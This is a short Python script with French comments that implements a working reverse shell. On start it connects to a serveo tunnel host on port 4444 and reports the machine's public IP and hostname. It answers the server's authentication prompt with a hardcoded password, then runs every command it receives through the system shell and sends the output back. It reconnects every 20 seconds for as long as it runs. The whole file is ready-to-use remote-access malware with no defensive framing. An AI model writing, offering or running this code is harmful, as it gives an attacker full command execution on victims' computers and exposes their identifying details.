import socket
import subprocess
import os
import time
import urllib.request

# --- CONFIGURATION ---
URL_SERVEO = "103fa379dfd22edd-93-23-16-243.serveousercontent.com"
PORT_SERVEO = 4444

def obtenir_ip_publique():
    try:
        return urllib.request.urlopen('https://api.ipify.org').read().decode('utf8')
    except:
        return "IP Inconnue"

def executer_commande(cmd):
    """Exécute les commandes et retourne le résultat"""
    try:
        return subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT).decode()
    except Exception as e:
        return str(e)

def connecter():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((URL_SERVEO, PORT_SERVEO))

            # Envoi des infos d'identification
            infos = f"Connecté depuis : {obtenir_ip_publique()} ({socket.gethostname()})"
            s.send(infos.encode('utf-8'))

            # Vérification du mot de passe
            msg = s.recv(1024).decode()
            if msg == "AUTH_REQUIRED":
                s.send(b"1234") # Le mot de passe configuré

            # Boucle de réception des commandes
            while True:
                data = s.recv(1024).decode().strip()
                if data.lower() == "exit": break
                
                # Exécution et renvoi du résultat
                resultat = executer_commande(data)
                s.send(resultat.encode() if resultat else b"Commande executee")

        except Exception:
            time.sleep(20) # Attend avant de réessayer partout dans le monde
            continue
        finally:
            s.close()

if __name__ == "__main__":
    connecter()
